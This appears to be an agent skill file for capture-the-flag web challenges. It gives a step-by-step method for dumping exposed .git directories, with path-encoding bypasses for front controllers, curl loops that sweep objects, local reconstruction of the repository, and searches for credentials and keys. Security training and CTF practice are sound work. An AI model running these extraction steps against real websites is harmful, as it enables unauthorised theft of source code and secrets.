---
name: git-exposed-repo-dump
description: >
  Use when the /.git directory appears accessible or suspected (200 on /.git/, hints in responses).
  Provides a procedure to dump repository contents despite front controllers by fetching HEAD/refs/objects
  and using path-encoding bypasses. Not for general source review; focuses on extraction.
---

Exploiting exposed .git directories

Why this matters
- Publicly accessible .git allows recovery of full source, credentials, and sometimes the flag. It’s a high-signal path—prioritize it.

Quick confirm
- Request these in order; a single successful raw fetch confirms the leak:
  - /.git/HEAD
  - /.git/config
  - /.git/packed-refs
  - /.git/refs/heads/master (or main)

Bypass front controllers / rewrites
- Try alternative path spellings until you retrieve raw Git text (e.g., "ref: refs/heads/..."):
  - /.git/HEAD
  - /.git/./HEAD
  - .git/HEAD (relative links on discovered pages)
  - /.git%2FHEAD
  - /%2Egit/HEAD or /.%2E/git patterns if applicable
  - //./.git/HEAD (double slashes)
  - /.git/HEAD.; /.git/HEAD. (trailing semicolon/dot)
  - Case variations if filesystem is case-insensitive (rare on Linux servers)

Minimal manual dump
1) Fetch HEAD and follow the ref:
   - HEAD → e.g., ref: refs/heads/main
   - Fetch /.git/refs/heads/main (or use packed-refs)
2) Try to fetch repository inventory files:
   - /.git/packed-refs
   - /.git/index (binary; contains file list)
   - /.git/objects/info/packs and /.git/objects/pack/pack-*.{pack,idx}
3) If index and packs are retrievable:
   - Download all pack files and the index.
   - Reconstruct locally (if git available):
     - mkdir -p dump/.git/objects/pack && place files there
     - git -C dump init; git -C dump fsck --full || git -C dump cat-file -p <object>
     - Alternatively use git unpack-objects < pack-*.pack
4) If only loose objects are available:
   - Iterate /.git/objects/??/* and download all.
   - Place under dump/.git/objects and run git -C dump fsck --lost-found, then inspect .git/lost-found/other

Quick curl helpers (illustrative)
- Download common control files:
  - for p in HEAD config packed-refs; do curl -fsSL "$URL/.git/$p" || true; done
- Loose objects sweep (hex dirs 00..ff):
  - for d in $(printf "%02x\n" {0..255}); do curl -fsSL "$URL/.git/objects/$d/" | sed -n 's/.*href=\"\([a-f0-9]\+\)\".*/\1/p' | while read f; do curl -fsSLo "objs/$d$f" "$URL/.git/objects/$d/$f"; done; done

What to look for after dump
- .env, config.php, database credentials, hardcoded API keys, admin backdoors, commit messages referencing secrets/flags.
- Grep the dump for FLAG{ and for typical secret patterns.

Common pitfalls
- Seeing the main page when requesting /.git/* and assuming it’s blocked → it may be routing; try the bypass forms above before giving up.
- Switching back to low-signal attacks (e.g., blind SQLi) before fully exhausting .git extraction.

Stop condition
- Once you retrieve the flag from the repo or leverage recovered code/creds to get it from the app, stop and report.
